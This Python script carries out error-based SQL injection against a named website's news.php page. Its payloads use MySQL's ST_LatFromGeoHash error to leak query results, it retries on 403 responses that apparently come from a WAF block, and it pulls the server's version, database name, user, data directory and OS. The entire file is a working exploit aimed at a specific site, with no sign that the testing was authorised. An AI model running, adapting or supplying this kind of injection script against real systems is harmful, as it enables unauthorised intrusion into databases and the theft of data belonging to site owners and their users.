#!/usr/bin/env python3
"""zagroup: ST_LatFromGeoHash extraction with retry on 403"""
import urllib.request, re, time

UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
BASE = "http://zagroup.net/news.php"

def fetch(url, timeout=10):
    for attempt in range(4):
        try:
            req = urllib.request.Request(url, headers=UA)
            r = urllib.request.urlopen(req, timeout=timeout)
            return r.status, r.read().decode("utf-8", "ignore")
        except urllib.error.HTTPError as e:
            if e.code == 403:
                time.sleep(3)
                continue
            return e.code, e.read(8000).decode("utf-8", "ignore")
        except Exception as ex:
            return 0, str(ex)
    return 403, ""

def extract(expr, tag):
    payload = "%27%20and%20ST_LatFromGeoHash(concat(0x7e," + expr + "))--%20"
    u = BASE + "?c=259" + payload
    code, body = fetch(u)
    m = re.search(r'MySQL server error</b>\s*:\s*<br>([^<]+)', body)
    if m:
        msg = m.group(1)
        # data is in the error near the end
        print("%-25s code=%s: %s" % (tag, code, msg[-150:]))
    else:
        print("%-25s code=%s size=%d %s" % (tag, code, len(body), "WAF/blocked" if code == 403 else ""))

print("=== extraction ===")
extract("version()", "version")
extract("database()", "database")
extract("user()", "user")
extract("@@datadir", "datadir")
extract("@@version_compile_os", "os")
